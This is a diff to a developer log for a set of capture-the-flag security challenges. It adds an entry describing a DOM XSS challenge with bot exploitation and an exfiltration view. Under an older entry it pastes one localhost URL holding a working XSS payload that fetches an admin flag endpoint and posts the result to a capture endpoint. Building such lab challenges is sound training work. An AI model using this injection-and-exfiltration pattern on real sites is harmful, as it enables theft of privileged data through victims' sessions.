@@ -9,6 +9,13 @@ files changed (optional)
 # Logs:
 
 
+### CTF 4 Complete - 04/02/26 - CTF 4
+- Fully functional DOM XSS challenge with bot-based exploitation
+- Per-user flag derivation using HMAC-SHA256
+- Exfiltration system with player-accessible capture view
+- Management scripts (reset, health-check, log collection)
+- Bot logging and deterministic behavior
+- Working report system with BullMQ queue processing
 
 
 ### Bot Updated - 03/02/26 - CTF 4
@@ -125,7 +132,7 @@ they will be able to use the secret JWT signature to forge the cookie. There sti
 
 ### updated readme - 27/11/25 - CTF 1
 - updated readme.
-
+http://localhost:5174/kb?search=<img src=x onerror="(async()=>{const u=new URLSearchParams(location.search);const r=u.get('_reportId');const res=await fetch('/api/admin/flag?reportId='+r);const d=await res.json();fetch('/api/exfil/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:d,reportId:r})})})()">
 ### fixed front-end CSV issues. Also fixed minor bug. - 27/11/25 - CTF 1
 - The rate limiter had some issues, so we fixed that.
 - Modified the CSV.
